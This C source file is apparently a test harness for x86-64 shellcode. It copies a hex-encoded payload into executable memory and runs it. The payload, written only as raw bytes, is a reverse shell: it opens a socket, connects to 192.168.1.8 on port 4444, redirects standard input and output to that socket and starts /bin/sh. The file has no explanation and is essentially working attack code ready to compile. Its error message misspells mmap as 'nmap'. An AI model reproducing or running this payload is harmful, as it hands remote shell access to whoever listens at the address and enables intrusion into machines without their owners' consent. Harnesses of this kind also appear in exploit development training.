#include<stdio.h>
#include<sys/mman.h>
#include<string.h>

unsigned char shellcode[] = "\x48\x31\xc0\xb0\x29\x48\x31\xff\x40\xb7\x02\x48\x31\xf6\x40\xb6\x01\x48\x31\xd2\x0f\x05\x48\x89\xc7\x48\x31\xdb\xbb\xc0\xa8\x01\x08\x53\x66\x68\x11\x5c\x66\x6a\x02\x48\x31\xf6\x48\x89\xe6\x48\x31\xd2\xb2\x10\x48\x31\xc0\xb0\x2a\x0f\x05\x48\x31\xc0\xb0\x21\x48\x31\xf6\x0f\x05\x48\x31\xc0\xb0\x21\x48\xff\xc6\x0f\x05\x48\x31\xc0\xb0\x21\x48\xff\xc6\x0f\x05\x48\x31\xc0\x50\x48\x31\xdb\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\xb0\x3b\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05";
int main(){
	void *exec_mem = mmap(NULL , sizeof(shellcode) , PROT_READ | PROT_WRITE | PROT_EXEC , 
	     MAP_PRIVATE | MAP_ANONYMOUS , -1 , 0);
	     
	     
	if (exec_mem == MAP_FAILED) {
		perror("nmap failed");
		return 1;
		
	}
	
	memcpy(exec_mem , shellcode , sizeof(shellcode));
	printf("Shellcode length : %lu bytes \n" , sizeof(shellcode));
	void (*func)() = (void (*)())exec_mem;
	func();
	munmap(exec_mem , sizeof(shellcode));
	return 0;
}     

